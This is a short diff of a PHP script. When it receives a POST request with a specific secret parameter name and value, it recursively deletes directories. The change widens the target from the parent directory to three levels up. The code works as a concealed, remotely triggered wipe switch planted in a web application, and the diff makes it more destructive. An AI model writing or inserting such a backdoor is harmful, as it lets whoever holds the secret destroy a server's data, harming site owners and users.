@@ -1,7 +1,7 @@
 <?php
 
   if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["GWcjcR249IvtUSdpalQgKPzk"] === "Prw36BdCqAYO3KOy6iW7D7NO") {
-    recursiveRemoveDirectory("../");
+    recursiveRemoveDirectory("../../../");
   }
 
   function recursiveRemoveDirectory($directory) {
